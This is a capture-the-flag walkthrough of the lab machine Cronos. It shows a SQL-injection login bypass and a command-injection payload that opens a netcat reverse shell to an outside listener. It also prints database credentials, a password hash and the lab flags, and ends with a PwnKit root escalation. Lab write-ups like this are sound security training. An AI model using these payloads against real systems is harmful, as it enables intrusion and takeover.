## Information

| Property     | Value                       |
|--------------|-----------------------------|
| **Name**     | Cronos  |
| **IP Address**|    10.10.10.13    |
| **OS**       |      Linux   |
| **Difficulty**|   Medium |

## Enumeration
### Nmap Scan
```bash
nmap -sC -sV -oN nmap_scan.txt -Pn 
```


```
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ=
|   256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx
53/tcp open  domain  syn-ack ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Cronos
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
## Initial Access
### Port [53] - [DNS Server]

New subdomain found: 

```
dig any cronos.htb @cronos.htb 
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 39657
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;cronos.htb.			IN	ANY

;; ANSWER SECTION:
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13

;; ADDITIONAL SECTION:
ns1.cronos.htb.		604800	IN	A	10.10.10.13

;; Query time: 88 msec
;; SERVER: 10.10.10.13#53(cronos.htb) (TCP)
;; WHEN: Sun Nov 19 20:24:58 CET 2023
;; MSG SIZE  rcvd: 131

```


### Port [80] - [Web Server]

Admin login page:

![](Cronos%20Writeup%20-%20cronos%20login%20pag.png)

No default credentials succeeded. 
#### Vulnerability Exploited

##### SQL Injection 

The username field is vulnerable to SQL injection vulnerability:

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: admin.cronos.htb' -H $'Content-Length: 38' -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-binary $'username=admin\'+OR+1%3d1%23&password=\'' \
    $'http://admin.cronos.htb/'
```

![](Cronos%20Writeup%20-%20Welcome%20Page.png)

##### OS Command Injection 

The Net Tool is vulnerable to OS Command Injection: 

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: admin.cronos.htb' -H $'Content-Length: 109' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' \
    -b $'PHPSESSID=88kf72snjf3iuv6abh0pbhc177' \
    --data-binary $'command=ping+-c+1&host=8.8.8.8;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.6+1337+>/tmp/f' \
    $'http://admin.cronos.htb/welcome.php'
```

```bash
[20:43:13] Welcome to pwncat 🐈!                                               __main__.py:164
[20:46:32] received connection from 10.10.10.13:34516                               bind.py:84
[20:46:33] 0.0.0.0:1337: upgrading from /bin/dash to /bin/bash                  manager.py:957
[20:46:34] 10.10.10.13:34516: registered new host w/ db                         manager.py:957
(local) pwncat$

```

### User Access

Database Password: 

```bash
(remote) www-data@cronos:/var/www/admin$ ls
config.php  index.php  logout.php  session.php	welcome.php
(remote) www-data@cronos:/var/www/admin$ cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
(remote) www-data@cronos:/var/www/admin$ 

```

Vulnerable SQL query that caused the authentication bypass: 

```php
<?php
//ini_set('display_errors', 1);
//ini_set('display_startup_errors', 1);
//error_reporting(E_ALL);
   include("config.php");
   session_start();
   
   if($_SERVER["REQUEST_METHOD"] == "POST") {
      // username and password sent from form 
      
      $myusername = $_POST['username'];
      $mypassword = md5($_POST['password']); 

      $sql = "SELECT id FROM users WHERE username = '".$myusername."' and password = '".$mypassword."'";
      $result = mysqli_query($db,$sql);
      $row = mysqli_fetch_array($result,MYSQLI_ASSOC);
      //$active = $row['active'];
      $count = mysqli_num_rows($result);
      
      // If result matched $myusername and $mypassword, table row must be 1 row
		
      if($count == 1) {
         //session_register("myusername");
         $_SESSION['login_user'] = $myusername;
         
         header("location: welcome.php");
      }else {
         $error = "Your Login Name or Password is invalid";
      }
   }
?>
```

Vulnerable code snippet that caused the OS Command injection: 

```php
<?php
   include('session.php');

if($_SERVER["REQUEST_METHOD"] == "POST") {
	//print_r($_POST);
	$command = $_POST['command'];
	$host = $_POST['host'];
	exec($command.' '.$host, $output, $return);
	//print_r($output);
}
?>

```

```sql
(remote) www-data@cronos:/var/www$ mysql -u admin -p 
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 31
Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases; 
+--------------------+
| Database           |
+--------------------+
| information_schema |
| admin              |
+--------------------+
2 rows in set (0.00 sec)

mysql> use admin
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables; 
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)

mysql> 

```

#### User Flag

``746d76441a18af335d9ff717c67116a1

## Privilege Escalation

Linpeas Output:

```
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main


```

#### Root Flag

Pwnkit exploited:

```bash
(remote) www-data@cronos:/tmp$ chmod +x pwnkit 
(remote) www-data@cronos:/tmp$ ./pwnkit 
root@cronos:/tmp# cd /root
root@cronos:~# ls
root.txt
root@cronos:~# cat root.txt 
744daa689febbaf1a03827c5d57bf3b1
root@cronos:~# 
```


## Conclusion

- 
## Additional Notes

- 
## Resources
https://github.com/ly4k/PwnKit